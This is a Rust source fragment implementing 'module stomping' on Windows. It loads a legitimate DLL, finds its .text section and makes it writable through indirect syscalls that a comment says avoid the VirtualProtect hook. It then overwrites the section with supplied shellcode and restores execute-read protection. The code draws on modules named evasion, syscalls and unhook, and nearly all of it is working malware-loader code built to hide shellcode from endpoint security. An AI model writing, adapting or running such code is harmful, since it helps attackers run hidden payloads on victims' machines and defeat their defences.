#[cfg(target_os = "windows")]
use windows_sys::Win32::System::LibraryLoader::{LoadLibraryA, GetModuleHandleA};

#[cfg(target_os = "windows")]
pub unsafe fn stomp_module(dll_name: &[u8], shellcode: &[u8]) -> Option<*mut u8> {
    use crate::evasion::{syscalls::get_ssn, unhook::get_text_section};

    LoadLibraryA(dll_name.as_ptr());
    let module_base = GetModuleHandleA(dll_name.as_ptr()) as *mut u8;
    if module_base.is_null() { return None; }

    let (text_rva, text_size) = get_text_section(module_base as *const u8);
    if text_size < shellcode.len() { return None; }

    let target = module_base.add(text_rva);

    let (ssn, tramp) = get_ssn(b"NtProtectVirtualMemory")?;
    let process_handle: isize = -1isize;
    let mut base   = target as usize;
    let mut sz     = shellcode.len();
    let mut old_p  = 0u32;

    // Make .text writable via syscall (avoids VirtualProtect hook)
    crate::evasion::syscalls::indirect_syscall(
        ssn, tramp,
        process_handle as usize,
        &mut base as *mut usize as usize,
        &mut sz   as *mut usize as usize,
        0x40,  // PAGE_EXECUTE_READWRITE
        &mut old_p as *mut u32 as usize,
        0,
    );

    core::ptr::copy_nonoverlapping(shellcode.as_ptr(), target, shellcode.len());

    // Restore to PAGE_EXECUTE_READ
    let mut base2 = target as usize;
    let mut sz2   = shellcode.len();
    crate::evasion::syscalls::indirect_syscall(
        ssn, tramp,
        process_handle as usize,
        &mut base2 as *mut usize as usize,
        &mut sz2   as *mut usize as usize,
        0x20,  // PAGE_EXECUTE_READ
        &mut old_p as *mut u32 as usize,
        0,
    );

    Some(target)
}
